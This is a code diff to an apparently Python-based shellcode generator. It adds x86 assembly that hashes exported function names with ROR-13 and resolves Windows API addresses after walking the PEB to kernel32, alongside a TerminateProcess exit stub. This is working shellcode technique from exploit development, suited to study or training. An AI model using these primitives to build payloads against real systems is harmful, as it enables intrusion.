@@ -193,7 +193,7 @@ def ret_asm() -> str:
         push ecx                                    ; Push 0 (exit code)
         push 0xFFFFFFFF                             ; Push -1 (current process handle)
         call eax                                    ; Call TerminateProcess
-        
+
     find_kernel32:
         xor ecx, ecx                                ; Zero out ECX
         mov esi, fs:[ecx + 0x30]                    ; move PEB to ESI
@@ -227,9 +227,35 @@ def ret_asm() -> str:
         mov esi, [eax + ecx*4]                      ; Get RVA of function name
         add esi, ebx                                ; Get VMA of function name
 
+    compute_hash:
+        xor eax, eax                                ; Zero out EAX (hash accumulator)
+        cdq                                         ; Clear EDX (Takes sign bit of EAX and fills EDX with 0s or 1s)
+        cld                                         ; Clear direction flag
+
+    hash_loop:
+        lodsb                                       ; Load byte at DS:ESI into AL, increment ESI
+        test al, al                                 ; Test if AL is NULL terminator
+        jz hash_done                                ; If zero, we are done
+        ror edx, 0xd                                ; Rotate EDX right by 13
+        add edx, eax                                ; Add AL to EDX
+        jmp hash_loop                               ; Repeat
+    hash_done:
+
+    compare_hash_to_function:
+        cmp edx, [esp + 0x24]                       ; Compare computed hash (EDX) to target hash (on stack)
+        jnz search_loop                             ; If not equal, continue searching
+        mov edx, [edi + 0x24]                       ; AddressofNameOrdinals RVA
+        add edx, ebx                                ; AddressofNameOrdinals VMA
+        mov cx, [edx + ecx*2]                       ; Get the ordinal
+        mov edx, [edi + 0x1C]                       ; AddressofFunctions RVA
+        add edx, ebx                                ; AddressofFunctions VMA
+        mov eax, [edx + ecx*4]                      ; Get function RVA
+        add eax, ebx                                ; Get function VMA
+        mov [esp + 0x1c], eax                       ; Store function address in EAX(stack) for return
     find_function_done:
         popad                                       ; Restore all registers
         ret
+
 
 
     """
